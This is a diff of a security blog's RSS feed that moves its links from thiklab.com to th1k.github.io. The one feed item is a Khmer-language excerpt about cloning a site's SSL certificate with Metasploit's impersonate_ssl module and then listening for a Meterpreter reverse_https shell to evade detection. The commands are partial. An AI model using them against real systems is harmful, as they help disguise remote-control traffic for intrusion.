@@ -7,7 +7,7 @@
   xmlns:media="http://search.yahoo.com/mrss/">
   <channel>
     <title>ssl on ThikLab - CyberSec</title>
-    <link>https://thiklab.com/en/tags/ssl/</link>
+    <link>https://th1k.github.io/en/tags/ssl/</link>
     <description>Recent content in ssl on ThikLab - CyberSec</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
@@ -16,17 +16,17 @@
     <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2023 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
     <lastBuildDate>Sat, 03 Dec 2022 21:01:06 +0700</lastBuildDate>
     
-        <atom:link href="https://thiklab.com/en/tags/ssl/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://th1k.github.io/en/tags/ssl/index.xml" rel="self" type="application/rss+xml" />
     
 
       
       <item>
         <title>Impersonate SSL - MSF Bypass Detection</title>
-        <link>https://thiklab.com/en/posts/bypass-detection-msf-shell/</link>
+        <link>https://th1k.github.io/en/posts/bypass-detection-msf-shell/</link>
         <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
         <author>thiklife403@gmail.com (Thik)</author>
         <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
-        <guid>https://thiklab.com/en/posts/bypass-detection-msf-shell/</guid>
+        <guid>https://th1k.github.io/en/posts/bypass-detection-msf-shell/</guid>
         <description>Clone SSL Certification តើអ្នកដឹងទេថា យើងអាចធ្វើការថតចម្លងនូវរាល់ឯកសារ SSL Certificate របស់គេហទំព័រដទៃបាន ដោយប្រើប្រាស់ Module មួយនៅក្នុង Metasploit Framework ដែលត្រូវបានបង្កើតឡើងដោយលោក Chris John Riley ។ ឯកសារដែលត្រូវបានថតចម្លងនោះ នឹងត្រូវរក្សាទុកជាប្រភេទទម្រង់ឯកសារ PEM ហើយវាក៏អាចប្រើប្រាស់បានគ្រប់ប្រភេទ Modules នៅក្នុង Metasploit ផងដែរ។
 ដើម្បីថតចម្លង យើងអាចប្រើប្រាស់ពាក្យបញ្ជាដូចខាងក្រោម៖
 1 2 3  use auxiliary/gather/impersonate_ssl set rhosts https://example.com/ exploit   ដូចដែលរូបបានបង្ហាញខាងលើ គឺយើងបានថតចម្លងឯកសារ Certificate បានសម្រេច។
@@ -35,7 +35,7 @@ Meterpreter Using SSL Connection ខាងក្រោមនេះគឺជា�
 1 2 3 4 5 6 7  use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set lhost 192.</description>
         
         <dc:creator>thik</dc:creator>
-        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        <media:content url="https://th1k.github.ioimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
         
         
         
